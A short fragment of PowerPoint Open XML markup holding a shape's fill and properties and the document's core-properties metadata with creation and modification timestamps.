            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A2F3A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>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16" name="Text 14"/>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2026-08-01T10:32:40Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-01T10:32:40Z</dcterms:modified>
</cp:coreProperties>
</file>